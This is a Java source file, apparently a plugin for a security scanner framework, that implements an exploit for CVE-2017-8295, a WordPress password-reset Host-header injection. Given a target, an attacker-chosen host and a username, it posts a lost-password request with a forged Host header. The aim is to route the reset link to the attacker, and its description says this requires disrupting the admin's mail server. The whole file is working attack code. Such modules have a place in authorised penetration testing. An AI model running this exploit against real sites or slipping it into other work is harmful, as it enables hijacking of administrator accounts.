package com.trackray.module.plugin;

import com.trackray.scanner.annotation.Plugin;
import com.trackray.scanner.annotation.Rule;
import com.trackray.scanner.enums.HttpMethod;
import com.trackray.scanner.plugin.AbstractPlugin;
import com.trackray.scanner.plugin.CommonPlugin;
import org.apache.http.message.BasicHeader;

import java.util.HashMap;
import java.util.Map;

@Plugin(value = "wordpress001",
        title = "CVE-2017-8295: WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞利用",
        desc = "需要提供目标，和邮箱域名以及需要重置的用户名，利用前提是要让管理员邮箱服务器拒绝服务",
        author = "blue", link = "http://www.freebuf.com/vuls/133816.html")
@Rule(param = {"target","host","username"} , type = AbstractPlugin.Type.JSON)
public class Wordpress001 extends CommonPlugin<String> {
    @Override
    public boolean check(Map<String, String> param) {
        return !param.isEmpty();
    }

    @Override
    public String start() {

        String url = param.get("target")+"/wp-login.php?action=lostpassword";

        crawlerPage.getRequest().setUrl(url);
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        HashMap<String, String> map = new HashMap<>();
        map.put("user_login",param.get("username"));
        map.put("redirect_to","");
        map.put("wp-submit","Get+New+Password");
        crawlerPage.getRequest().addHttpHeader(new BasicHeader("Host",param.get("host")));
        crawlerPage.getRequest().setParamMap(map);
        fetcher.run(crawlerPage);
        return crawlerPage.getResponse().getStatus().getContent();
    }
}
